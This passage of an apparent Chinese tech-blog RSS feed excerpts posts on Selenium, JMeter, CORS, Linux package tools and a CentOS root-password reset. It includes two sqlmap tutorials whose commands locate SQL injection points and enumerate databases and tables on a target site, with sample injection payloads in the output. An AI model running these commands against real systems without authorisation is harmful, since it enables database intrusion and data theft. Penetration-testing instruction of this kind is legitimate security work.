element = driver.find_element_by_id(&amp;#34;myid&amp;#34;) driver.execute_script(&amp;#34;arguments[0].click();&amp;#34;, element) 回答 这两种方法的本质区别在浏览器的操作上：
 WebDriver：**当 WebDriver 执行单击时，它会尽可能地模拟当真实用户使用浏览器时发生的情况。**比如您有一个元素 A，该按钮显示&amp;quot;单击我&amp;quot;，元素 B 是一个透明但具有其尺寸和设置的元素 B，B 完全覆盖 A。然后，您告诉 WebDriver 单击 A，WebDriver 将模拟单击，但结果却是 B 首先接收单击。这是因为 B 覆盖 A，如果用户尝试单击 A，则 B 将首先获取事件。A 最终是否会获得单击事件取决于 B 处理事件的方式。无论如何，在这种情况下，WebDriver 的行为与实际用户尝试单击 A 时的行为相同。 JavaScript：**假如您使用 JavaScript 来做 。单击此方法不会重现用户尝试单击 A 时真正发生的情况。**JavaScript 将事件直接发送到 A，B 不会收到任何事件。  这也就解释了为什么 JavaScript 单击在 WebDriver 单击不起作用时有效？
正如我上面提到的，WebDriver 将尽力模拟当真实用户使用浏览器时发生的情况。事实是，DOM 可以包含用户无法与之交互的元素，并且 WebDriver 不允许您单击这些元素。除了我提到的重叠情况外，这还要求不能单击不可见的元素。我在其他一些问题中看到的一个常见情况是有人试图与 DOM 中已经存在的 GUI 元素进行交互，但仅在操作某些其他元素时才可见。这有时会与下拉菜单有关：您必须先单击显示下拉列表的按钮，然后才能选择菜单项。如果有人尝试在菜单可见之前单击菜单项，WebDriver 会犹豫，并说无法操作该元素。如果此人随后尝试使用 JavaScript 进行操作，它将起作用，因为事件直接传递到元素，而不考虑可见性。</description>
    </item>
    
    <item>
      <title>BUG(6)——Wapiti 报告丢失 js 文件</title>
      <link>https://ac-lm.github.io/posts/bug/bug6wapiti-%E6%8A%A5%E5%91%8A%E4%B8%A2%E5%A4%B1-js-%E6%96%87%E4%BB%B6/</link>
      <pubDate>Mon, 30 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug6wapiti-%E6%8A%A5%E5%91%8A%E4%B8%A2%E5%A4%B1-js-%E6%96%87%E4%BB%B6/</guid>
      <description>BUG描述 在 wapiti 的 3.0.4 版本中：HTTP request and cURL command hidden on html report，HTTP 报告缺少 js 文件
Resolution 需手动从目录 wapitiCore/report_template 中找到并添加
 Ok, when generating the html report it is supposed to copy the js file from wapitiCore/report_template into output directory, that is why it was missing.
  参考文献：github-wapiti-issues @Maxime Alay-Eddine 
 </description>
    </item>
    
    <item>
      <title>Python(7)——unittest 单元测试框架</title>
      <link>https://ac-lm.github.io/posts/python/python7unittest-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/</link>
      <pubDate>Mon, 30 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/python/python7unittest-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%E6%A1%86%E6%9E%B6/</guid>
      <description>1.Test Case 一个 TestCase 的实例就是一个测试用例。一个完整的测试流程，包括测试前准备环境的搭建(setUp)，执行测试代码 (run)，以及测试后环境的还原(tearDown)。元测试(unit test)的本质也就在这里，一个测试用例是一个完整的测试单元，通过运行这个测试单元，可以对某一个问题进行验证。
class testcase(unittest.TestCase): @classmethod def setUpClass(self): # 所有的测试方法运行前运行，整个测试过程中只执行一次。 pass def setUp(self): # 每个测试方法运行前运行，一条用例执行一次，若N次用例就执行N次。 pass def tearDown(self)： # 每个测试方法运行结束后运行,一条用例执行一次，若N次用例就执行N次。 @classmethod def tearDownClass(self)： # 所有的测试方法运行结束后运行，整个测试过程中只执行一次。 pass def test_01(self): # 测试用例 pass 2.Test Suite 多个测试用例集合在一起，就是TestSuite，而且TestSuite也可以嵌套TestSuite。
if __name__ == &amp;#34;__main__&amp;#34;: # 构造TestSuite suite = unittest.TestSuite() suite.addTest(testcase(&amp;#34;test_01&amp;#34;)) suite.addTest(testcase(&amp;#34;test_02&amp;#34;)) # 执行测试 runner = unittest.TextTestRunner() runner.run(suite) 3.Test Loader 是用来加载TestCase到TestSuite中的，其中有几个 loadTestsFrom??() 方法，就是从各个地方寻找TestCase，创建它们的实例，然后add到TestSuite中，再返回一个TestSuite实例。
if __name__ == &amp;#34;__main__&amp;#34;: #此用法可以同时测试多个类 suite1 = unittest.TestLoader().loadTestsFromTestCase(TestCase1) suite2 = unittest.</description>
    </item>
    
    <item>
      <title>随记(14)——跨域资源请求 CORS</title>
      <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B014%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E8%AF%B7%E6%B1%82-cors/</link>
      <pubDate>Mon, 30 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B014%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%E8%AF%B7%E6%B1%82-cors/</guid>
      <description>1.什么是CORS CORS是一个W3C标准，全称是&amp;quot;跨域资源共享&amp;quot;，它允许浏览器向跨源服务器，发出XMLHttpRequest请求，从而克服了AJAX只能同源使用的限制。整个CORS通信过程，都是浏览器自动完成，不需要用户参与。对于开发者来说，CORS通信与同源的AJAX通信没有差别，代码完全一样。浏览器一旦发现AJAX请求跨源，就会自动添加一些附加的头信息，有时还会多出一次附加的请求，但用户不会有感觉。因此，实现CORS通信的关键是服务器。只要服务器实现了CORS接口，就可以跨源通信。
2.浏览器的同源安全策略 浏览器只允许请求当前域的资源，而对其他域的资源表示不信任。那怎么才算跨域呢？
 请求协议http,https的不同 域domain的不同 端口port的不同  3.HTTP的两种请求 浏览器将CORS请求分成两类：简单请求（simple request）和 非简单请求（not-so-simple request）。只要同时满足以下两大条件，就属于简单请求。
（1) 请求方法是以下三种方法之一：
 HEAD GET POST  （2）HTTP的头信息不超出以下几种字段：
 Accept Accept-Language Content-Language Last-Event-ID Content-Type：只限于三个值（application/x-www-form-urlencoded、multipart/form-data、text/plain）  凡是不同时满足上面两个条件，就属于非简单请求。浏览器对这两种请求的处理，是不一样的。
4.简单请求 对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。下面是一个例子，浏览器发现这次跨源AJAX请求是简单请求，就自动在头信息之中，添加一个Origin字段。
GET /cors HTTP/1.1 Origin: http://api.bob.com Host: api.alice.com Accept-Language: en-US Connection: keep-alive User-Agent: Mozilla/5.0... 上面的头信息中，Origin字段用来说明，本次请求来自哪个源（协议 + 域名 + 端口）。服务器根据这个值，决定是否同意这次请求。
如果Origin指定的源，不在许可范围内，服务器会返回一个正常的HTTP回应。浏览器发现，这个回应的头信息没有包含Access-Control-Allow-Origin字段（详见下文），就知道出错了，从而抛出一个错误，被XMLHttpRequest的onerror回调函数捕获。注意，这种错误无法通过状态码识别，因为HTTP回应的状态码有可能是200。
如果Origin指定的域名在许可范围内，服务器返回的响应，会多出几个头信息字段。
GET /cors HTTP/1.1 Access-Control-Allow-Origin: http://api.bob.com Access-Control-Allow-Credentials: true Access-Control-Expose-Headers: FooBar Content-Type: text/html; charset=utf-8 上面的头信息之中，有三个与CORS请求相关的字段，都以Access-Control-开头。
 Access-Control-Allow-Origin：该字段是必须的。它的值要么是请求时Origin字段的值，要么是一个*，表示接受任意域名的请求。 Access-Control-Allow-Credentials：该字段可选。它的值是一个布尔值，表示是否允许发送Cookie。默认情况下，Cookie不包括在CORS请求之中。设为true，即表示服务器明确许可，Cookie可以包含在请求中，一起发给服务器。这个值也只能设为true，如果服务器不要浏览器发送Cookie，删除该字段即可。 Access-Control-Expose-Headers：该字段可选。CORS请求时，XMLHttpRequest对象的getResponseHeader()方法只能拿到6个基本字段：Cache-Control、Content-Language、Content-Type、Expires、Last-Modified、Pragma。如果想拿到其他字段，就必须在Access-Control-Expose-Headers里面指定。上面的例子指定，getResponseHeader(&amp;lsquo;FooBar&amp;rsquo;)可以返回FooBar字段的值。  5.</description>
    </item>
    
    <item>
      <title>BUG(5)——爬虫中乱码的成因及处理</title>
      <link>https://ac-lm.github.io/posts/bug/bug5%E7%88%AC%E8%99%AB%E4%B8%AD%E4%B9%B1%E7%A0%81%E7%9A%84%E6%88%90%E5%9B%A0%E5%8F%8A%E5%A4%84%E7%90%86/</link>
      <pubDate>Sun, 29 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug5%E7%88%AC%E8%99%AB%E4%B8%AD%E4%B9%B1%E7%A0%81%E7%9A%84%E6%88%90%E5%9B%A0%E5%8F%8A%E5%A4%84%E7%90%86/</guid>
      <description>为什么会出现乱码 在使用 Python 爬虫时，有些网站获取的数据会出现乱码，这是由于 Requests 模块会基于 HTTP 头对响应的编码作出有根据的推测。当获取到响应结果的文本(text属性)后，Requests 会使用其推测的文本进行编码。当编码出现错误时，就会出现乱码。此时我们可以使用以下这两个方法查看响应文本的编解码类型。
print(res.encoding) # 查看网页返回的字符集类型，其值是从 header 中的 charset 字段中提取的编码方式，若 header 中没有 charset 字段则默认为 ISO-8859-1 编码模式，是默认使用的编码格式 print(res.apparent_encoding) # 自动判断字符集类型，apparent_encoding 会从网页的内容中分析网页编码的方式，所以 apparent_encoding 比 encoding 更加准确。当网页出现乱码时可以把 apparent_encoding 的编码格式赋值给 encoding。 输出结果
# Python 使用的编解码格式 ISO-8859-1 # 实际应该使用的编解码格式 GB2312 可以发现 Requests 推测的文本编码 ISO 与源网页编码 GBK 不一致
乱码怎么出现的 当源网页编码和爬取下来后的编码转换不一致时，程序就会出现乱码。比如源网页为 GBK 编码的字节流，在我们抓取后，程序直接使用 UTF-8 进行编码并输出到文件中，此时必然会引起乱码。
现如今主流的编码有：Unicode、ISO-8859-1、GBK2312、GBK、UTF-8 等几种。
最早的编码是 ISO-8859-1，和 ASCII 编码相似。ISO-8859-1 属于单字节编码，最多能表示的字符范围是 0-255，应用于英文环境。很明显，ISO-8859-1 编码表示的字符范围很窄，无法表示中文字符。
1981年中国人民通过对 ASCII 编码的中文扩充改造，产生了 GBK2312 编码，可以表示 6000 多个常用汉字。但汉字实在是太多了，包括繁体和各种字符，于是产生了 GBK 编码，它包括了 GBK2312 中的编码，同时扩充了很多。</description>
    </item>
    
    <item>
      <title>BUG(4)——Jmeter 的一些问题</title>
      <link>https://ac-lm.github.io/posts/bug/bug4jmeter-%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</link>
      <pubDate>Sat, 28 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug4jmeter-%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</guid>
      <description>BUG 描述 运行内存配置修改
Resolution if not defined HEAP ( rem See the unix startup file for the rationale of the following parameters, rem including some tuning recommendations set HEAP=-Xms5g -Xmx5g -XX:MaxMetaspaceSize=5120m ) 修改 bat 文件中 HEAP 值。HEAP=-Xms**5g** -Xmx**5g**，最小与最大运行内存。MaxMetaspaceSize，最大堆栈 。
 BUG 描述 端口被突然关闭 socket closed
Resolution 原因：发送请求时，Jmeter 一般默认选择 Use KeepAlive，即保持连接协议，但由于 JMeter.properties 中时间设置默认注销，即不会等待，因此一旦连接空闲，就会断开，从而导致报错
解决：修改 httpclient4.idletimeout=&amp;lt;time in ms&amp;gt; ，一般可设置成 1000-6000ms（表示连接空闲10s后才会断开）。
 BUG 描述 地址被占用 address already in use:connect
错误：java.net.BindException: Address already in use: connect</description>
    </item>
    
    <item>
      <title>BUG(3)—Windows 下 shell 脚本无法在 Linux 运行</title>
      <link>https://ac-lm.github.io/posts/bug/bug3windows-%E4%B8%8B-shell-%E8%84%9A%E6%9C%AC%E6%97%A0%E6%B3%95%E5%9C%A8-linux-%E8%BF%90%E8%A1%8C/</link>
      <pubDate>Fri, 27 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug3windows-%E4%B8%8B-shell-%E8%84%9A%E6%9C%AC%E6%97%A0%E6%B3%95%E5%9C%A8-linux-%E8%BF%90%E8%A1%8C/</guid>
      <description>BUG 描述 Windows 下使用记事本编写的 shell 脚本，在上传到 Linux 系统后，无法运行，结果返回错误。
Resolution 这是由于 Windows 系统编码与 Linux 系统编码不同导致的，Windows 系统编码中回车会编码成 \n\r，而 Linux 系统中回车则是 \n，正因如此，Windows 下编写的 shell 脚本无法在 Linux 下运行。</description>
    </item>
    
    <item>
      <title>BUG(2)—Linux 修改密码以及旧版本删除</title>
      <link>https://ac-lm.github.io/posts/bug/bug2linux-%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E4%BB%A5%E5%8F%8A%E6%97%A7%E7%89%88%E6%9C%AC%E5%88%A0%E9%99%A4/</link>
      <pubDate>Thu, 26 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug2linux-%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E4%BB%A5%E5%8F%8A%E6%97%A7%E7%89%88%E6%9C%AC%E5%88%A0%E9%99%A4/</guid>
      <description>BUG 描述 CentOS7 进入单用户模式修改密码
Resolution 在选择系统界面，按 E 进入启动配置，定位到命令 Ro ，将其改为 rw init=/sysroot/bin/sh，Ctrl+X进行重启，进入单用户模式，执行chroot /sysroot进入系统目录，输入passwd root修改密码，touch /.autorelabel执行修改
 BUG 描述 centos7 开机界面有时会出现多个选项，这是由于更新导致的。列表中前几个选项为系统旧版本，最后为急救模式启动。
在 CentOS 中，系统更新后并不会自动删除旧内核，因此启动选项中会有多个内核的选项，用户可以手动进行删除。
Resolution uname -a rpm -qa | grep kernel # 查看安装内核 yum remove kernel-3.10.0-229.14.1.el7 # 删除 reboot # 重启 </description>
    </item>
    
    <item>
      <title>Net(7)——在 Linux 中的搭建 JMeter 性能测试</title>
      <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net7%E5%9C%A8-linux-%E4%B8%AD%E7%9A%84%E6%90%AD%E5%BB%BA-jmeter-%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/</link>
      <pubDate>Thu, 26 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net7%E5%9C%A8-linux-%E4%B8%AD%E7%9A%84%E6%90%AD%E5%BB%BA-jmeter-%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95/</guid>
      <description>1.Linux下的Jmeter Jmeter 官网下载 
tar -xvf Jmeter.tgz # 注意需配置Java环境 2.配置Jmeter环境 vi /etc/profile #编辑环境 #----------------------------------------# #Jmeter environment export JMETER_HOME=/root/Jmeter export PATH=$PATH:${JMETER_HOME}/bin ####### source /etc/profile #启动环境 jmeter -v #检查是否成功运行 jmeter –n –t test.jmx –l test.jtl #执行jmeter脚本 3.jmeter命令参数 -h 帮助 -&amp;gt; 打印出有用的信息并退出 -n 非 GUI 模式 -&amp;gt; 在非 GUI 模式下运行 JMeter -t 测试文件 -&amp;gt; 要运行的 JMeter 测试脚本文件 -l 日志文件 -&amp;gt; 记录结果的文件 -r 远程执行 -&amp;gt; 启动远程服务 -H 代理主机 -&amp;gt; 设置 JMeter 使用的代理主机 -P 代理端口 -&amp;gt; 设置 JMeter 使用的代理主机的端口号 </description>
    </item>
    
    <item>
      <title>BUG(1)—无头浏览器导致的元素不可见</title>
      <link>https://ac-lm.github.io/posts/bug/bug1%E6%97%A0%E5%A4%B4%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%BC%E8%87%B4%E7%9A%84%E5%85%83%E7%B4%A0%E4%B8%8D%E5%8F%AF%E8%A7%81/</link>
      <pubDate>Wed, 25 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/bug/bug1%E6%97%A0%E5%A4%B4%E6%B5%8F%E8%A7%88%E5%99%A8%E5%AF%BC%E8%87%B4%E7%9A%84%E5%85%83%E7%B4%A0%E4%B8%8D%E5%8F%AF%E8%A7%81/</guid>
      <description>BUG 描述 WebDriver 在使用 headless 时，默认会将窗口设置为 0x0，并且处于 Minimized 状态。这样会导致程序启动后，部分元素由于没有打印而无法被点击的异常
Resolution 在启动 WebDriver 时先配置浏览器大小
options.add_argument(&amp;#34;--headless&amp;#34;) options.add_argument(&amp;#39;window-size=1920x1080&amp;#39;) options.add_argument(&amp;#39;--start-maximized&amp;#39;) # 警告，针对不同内核方法可能有差别，但参数一致。 </description>
    </item>
    
    <item>
      <title>Net(6)——JMeter性能测试工具</title>
      <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net6jmeter-%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</link>
      <pubDate>Wed, 25 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net6jmeter-%E6%80%A7%E8%83%BD%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/</guid>
      <description>参考文献：JMeter 用户文档 
 1.Apache JMeter™ Apache JMeter™ 是一个开源的，纯 Java 编写的性能测试软件。JMeter 可以运行在任何具有合规 Java 的系统上（即有 Java 环境），下载最新的生产版本后，进入 bin 文件夹，运行 jmeter.bat （用于 Windows）或 jmeter（用于 Unix）文件启动 JMeter。
2.如何开始 测试计划描述了 JMeter 在运行时将执行的一系列步骤。完整的测试计划将由一个或多个线程组、逻辑控制器、生成控制器、监听器、计时器、断言和配置元素（Thread Groups，logic controllers，sample generating controllers，listeners，timers，assertions and configuration elements）组成。
2.1 添加和删除元素 通过右键单击树中的元素，并从&amp;quot;add&amp;quot; 列表中选择新元素，就可以在测试计划中添加元素。
2.2 配置树元素 测试树中的任何元素都会在 JMeter 的右侧框架中呈现控件。这些控件允许您配置该特定测试元素的行为。元素的配置取决于元素的类型。测试树本身可以通过拖动和丢弃测试树周围的组件来操作。
2.3 保存测试计划 我们建议您在运行之前将测试计划保存到文件中。要保存测试计划，请从文件菜单中选择 &amp;ldquo;Save&amp;rdquo; 或 &amp;ldquo;Save Test Plan As &amp;hellip;&amp;rdquo;
JMeter 允许您保存整个测试计划树或仅保存其中的一部分。要仅保存位于测试计划树特定&amp;quot;分支&amp;quot;中的元素，请选择从该树开始&amp;quot;分支&amp;quot;的树中的测试计划元素，然后单击右鼠标按钮选择 &amp;ldquo;Save Selection As …&amp;rdquo; 或者从编辑菜单中选择 &amp;ldquo;Save Selection As …&amp;quot;。
2.4 运行测试计划 要运行您的测试计划，请从 &amp;ldquo;Run&amp;rdquo; 菜单项中选择 &amp;ldquo;Start&amp;quot;。当 JMeter 运行时，它会在菜单栏下方的部分右侧显示一个小的绿色框。绿色框左侧的数字是活动线程 / 线程总数。这些仅适用于本地运行测试；它们不包括在使用客户端服务器模式时在远程系统上启动的任何线程。</description>
    </item>
    
    <item>
      <title>Linux(11)——npm 包管理工具</title>
      <link>https://ac-lm.github.io/posts/linux/linux11npm-%E5%8C%85%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</link>
      <pubDate>Tue, 24 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux11npm-%E5%8C%85%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</guid>
      <description>1.npm npm是一款包管理工具，允许用户从npm服务器下载别人编写的第三方包或命令行程序到本地使用。
由于npm是随Node.js一起安装的，所以我们安装Node.js即可安装npm
wget https://cdn.npm.taobao.org/dist/node/latest-v15.x/node-v15.9.0-linux-x64.tar.gz #下载源码 tar -zxvf node-v15.9.0-linux-x64.tar.gz #解压文件 vim /etc/profile #编辑环境变量 #### export PATH=$PATH:/opt/node-v15.9.0/bin #### source /etc/profile #启用环境 配置后启动环境，若配置环境后无法使用，需运行此命令 node -v npm -v 2.npm配置 # 下载源配置 npm config set registry https://registry.npm.taobao.org npm config get registry # 查看当前目录已安装插件 npm list # 安装cnpm，淘宝团队做的国内镜像npm npm install -g cnpm --registry=https://registry.npm.taobao.org </description>
    </item>
    
    <item>
      <title>Linux(10)——pip 软件管理工具</title>
      <link>https://ac-lm.github.io/posts/linux/linux10pip-%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</link>
      <pubDate>Mon, 23 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux10pip-%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</guid>
      <description>1.pip 不同于 python3 自带 pip 软件管理工具，python2 并不自带，需要自己安装
wget https://bootstrap.pypa.io/pip/2.7/get-pip.py # pip3 wget https://bootstrap.pypa.io/get-pip.py # wget下载命令，会下载到当前目录，如报错，yum -y install wget python get-pip.py #编译 pip -V PS：如果不想自己安装，可以使用yum install python3安装 python3 来使用 pip，命令 pip3 -V
2.修改pip下载源 pip -i https://pypi.douban.com/simple install Flask --trusted-host pypi.douban.com #手动指定 pip config set global.index-url https://mirrors.aliyun.com/pypi/simple/ #环境指定 ############### 清华：https://pypi.tuna.tsinghua.edu.cn/simple 阿里云：https://mirrors.aliyun.com/pypi/simple/ 中国科技大学 https://pypi.mirrors.ustc.edu.cn/simple/ 华中理工大学：https://pypi.hustunique.com/ 山东理工大学：https://pypi.sdutlinux.org/ 豆瓣：https://pypi.douban.com/simple/ PS：如果系统报错ERROR: unknown command “config”，这是因为 pip 版本过低，使用命令 pip install -U pip即可
3.pip的使用 pip list #已安装 pip list --outdated #可更新 pip install --upgrade 包 #更新 </description>
    </item>
    
    <item>
      <title>Linux(9)——Python3.6 安装</title>
      <link>https://ac-lm.github.io/posts/linux/linux9python3.6-%E5%AE%89%E8%A3%85/</link>
      <pubDate>Sun, 22 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux9python3.6-%E5%AE%89%E8%A3%85/</guid>
      <description>1.前言 Linux 系统自带 Python2，这是由于部分命令需要使用 Python2，如 yum，要使用 Python3 则需另外安装。（本文使用的是 CentOS7 ，其他发行版大同小异）
python -V #查看Py版本 python -m XXXX #执行终端命令，-m参数使得Python预先import你要的package或module给你，然后再执行script。 which python #查看python命令是连接到那个文件 #### /usr/bin/python #### cd /usr/bin/ #进入bin文件夹 ll python* #列出包含python字段的文件 #### lrwxrwxrwx. 1 root root 16 11月 17 11:42 python -&amp;gt; /usr/bin/python2 lrwxrwxrwx. 1 root root 9 11月 13 11:01 python2 -&amp;gt; python2.7 -rwxr-xr-x. 1 root root 7144 10月 14 22:46 python2.7 -rwxr-xr-x. 1 root root 1835 10月 14 22:45 python2.7-config lrwxrwxrwx.</description>
    </item>
    
    <item>
      <title>Net(5)——sqlmap使用实例</title>
      <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net5sqlmap-%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/</link>
      <pubDate>Sat, 21 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net5sqlmap-%E4%BD%BF%E7%94%A8%E5%AE%9E%E4%BE%8B/</guid>
      <description>1.第一步：查找注入点 sqlmap -u &amp;#39;192.168.3.59/article.php?id=1&amp;#39; #必须带上GET参数，否则sqlmap不知道如何注入 root@kali:~# sqlmap -u &amp;#39;192.168.3.59/article.php?id=1&amp;#39; ___ __H__ ___ ___[,]_____ ___ ___ {1.1.11#stable} |_ -| . [.] | .&amp;#39;| . | |___|_ [(]_|_|_|__,| _| |_|V |_| http://sqlmap.org [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&amp;#39;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program [*] starting at 11:30:43 [11:30:43] [INFO] resuming back-end DBMS &amp;#39;mysql&amp;#39; [11:30:43] [INFO] testing connection to the target URL sqlmap resumed the following injection point(s) from stored session: --- Parameter: id (GET) Type: boolean-based blind Title: AND boolean-based blind - WHERE or HAVING clause Payload: id=1 AND 1817=1817 Type: AND/OR time-based blind Title: MySQL &amp;gt;= 5.</description>
    </item>
    
    <item>
      <title>Linux(8)——linux 的文件权限</title>
      <link>https://ac-lm.github.io/posts/linux/linux8linux-%E7%9A%84%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/</link>
      <pubDate>Fri, 20 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux8linux-%E7%9A%84%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/</guid>
      <description>示例文件
drwxr-x--- 2 root root 37 Apr 18 10:50 data -rw-r--r-- 1 root root 68549 Sep 26 2018 fields.yml -rwxr-xr-x 1 root root 33903123 Sep 26 2018 filebeat -rwxr-xr-x 1 root root 1011 Mar 27 10:13 filebeat-docker.yml -rw-r--r-- 1 root root 66260 Sep 26 2018 filebeat.reference.yml -rw------- 1 root root 7231 Sep 26 2018 filebeat.yml drwxr-xr-x 4 root root 22 Sep 26 2018 kibana -rw-r--r-- 1 root root 13675 Sep 26 2018 LICENSE.</description>
    </item>
    
    <item>
      <title>Linux(7)——yum 软件管理工具</title>
      <link>https://ac-lm.github.io/posts/linux/linux7yum-%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</link>
      <pubDate>Thu, 19 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/linux/linux7yum-%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/</guid>
      <description>1.yum # 新建一个目录用来保存yum安装包  mkdir install # 进入文件夹并输入命令 cd install wget http://yum.baseurl.org/download/3.2/yum-3.2.28.tar.gz # 解压 tar -xvf yum-3.2.28.tar.gz # 重点：解压后先不着急安装，手动创建一个yum的conf文件，不然会报找不到文件的错 yum.cli:Config Error: Error accessing file for config file:///etc/ # touch /etc/yum.conf # 进入yum目录，脚本安装 cd yum-3.2.28 ./yummain.py install yum # 期间会提示安装新版本，y回车即可 2.使用 yum -y remove xxxx #卸载 yum -y install xxxxx #安装 </description>
    </item>
    
    <item>
      <title>Net(4)——sqlmap 使用指南</title>
      <link>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net4sqlmap-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</link>
      <pubDate>Thu, 19 Nov 2020 00:00:00 +0000</pubDate>
      
      <guid>https://ac-lm.github.io/posts/%E7%BD%91%E7%BB%9C%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/net4sqlmap-%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</guid>
      <description>1.sqlmap中部分参数的备注 星号（ * ） 在注入的过程中，有时候会存在伪静态的页面，此时可以使用星号表示可能存在注入的部分
sqlmap可以区分一个 URL 里面的参数来进行注入点测试，但在遇到了一些做了伪静态的网页就无法自动识别了。
&amp;#39;/admin/1/&amp;#39; 类似于这种，SQLMap 便无法进行注入测试，但它实际上可能是这样的：&amp;#39;/admin.php?id=1&amp;#39; 它只是把参数隐藏在了 URL 中，对于这种网页，直接在参数后加上一个星号即可。
sqlmap -u &amp;#34;www.baidu.com/admin/1*&amp;#34; –data 使用post方式提交的时候，就需要用到data参数了
-p 当我们已经事先知道哪一个参数存在注入就可以直接使用-p来指定，从而减少运行时间
–level 不同的level等级，sqlmap所采用的策略也不近相同，当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数；当–level参数设定为3或者3以上的时候，会尝试对User-Angent，referer进行注入。
–random-agent 使用该参数，sqlmap会自动的添加useragent参数，如果你知道它要求你用某一种agent，你也应当用user-agent选项自己指定所需的agent
–technique 这个参数可以指定sqlmap使用的探测技术，默认情况下会测试所有的方式。支持的探测方式如下：
 B: Boolean-based blind SQL injection（布尔型注入） E: Error-based SQL injection（报错型注入） U: UNION query SQL injection（可联合查询注入） S: Stacked queries SQL injection（可多语句查询注入） T: Time-based blind SQL injection（基于时间延迟注入）  2.常用的指令 检查注入点 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; 列数据库信息 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; --dbs 指定库名列出所有表 sqlmap -u &amp;#34;http://ooxx.com.tw/star_photo.php?artist_id=11&amp;#34; -D xxxxx --tables 指定库名表名列出所有字段 sqlmap -u &amp;#34;http://ooxx.</description>
    </item>
    
    <item>
      <title>计算机网络(2)——子网掩码</title>
      <link>https://ac-lm.github.io/posts/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C2%E5%AD%90%E7%BD%91%E6%8E%A9%E7%A0%81/</link>
      <pubDate>Thu, 19 Nov 2020 00:00:00 +0000</pubDate>
      
